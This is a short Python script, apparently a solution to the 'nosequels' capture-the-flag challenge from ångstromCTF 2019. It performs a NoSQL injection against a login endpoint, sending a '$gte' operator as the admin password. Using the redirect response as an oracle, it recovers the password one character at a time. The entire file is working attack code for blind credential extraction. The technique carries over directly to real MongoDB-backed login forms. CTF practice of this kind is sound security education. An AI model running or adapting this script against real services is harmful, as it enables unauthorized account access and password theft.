import requests
import string

s = requests.Session()
url = 'https://nosequels.2019.chall.actf.co/login'

cookie = requests.cookies.create_cookie(name='token', value='jwt-token')
s.cookies.set_cookie(cookie)

def checkPrefix(prefix):
    r = s.post(url, json={"username":"admin", "password":{"$gte": prefix}}, allow_redirects=False)
    try:
        r.headers['Location']
        return True
    except:
        return False


password = ''

lastC = ''

while 1:
    for c in string.ascii_letters:
        if not checkPrefix(password+c):
            password += lastC
            print password
            break
        lastC = c


